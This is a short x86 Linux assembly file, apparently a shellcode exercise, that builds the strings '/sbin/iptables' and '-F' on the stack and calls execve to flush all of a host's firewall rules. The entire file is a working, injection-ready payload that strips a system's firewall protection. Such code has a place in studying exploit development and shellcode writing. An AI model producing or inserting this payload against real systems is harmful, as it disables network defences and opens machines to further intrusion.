; iptables_flush.asm
;
; Author: Dennis Tan
; Date: 11-June-2020

global _start

section .text
    _start:
        xor ebx, ebx
        mul ebx
        
        push edx
        push word 0x462d
        mov esi, esp

        ; selbatpi
        push edx
        mov dword [esp-4], 0x73656c62
        mov dword [esp-8], 0x61747069
        sub esp, 8

        ; /nibs///
        push 0x2f6e6962
        push 0x732f2f2f
        mov ebx, esp

        push edx
        push esi
        push ebx

        mov ecx, esp
        mov al, 0xb
        int 0x80
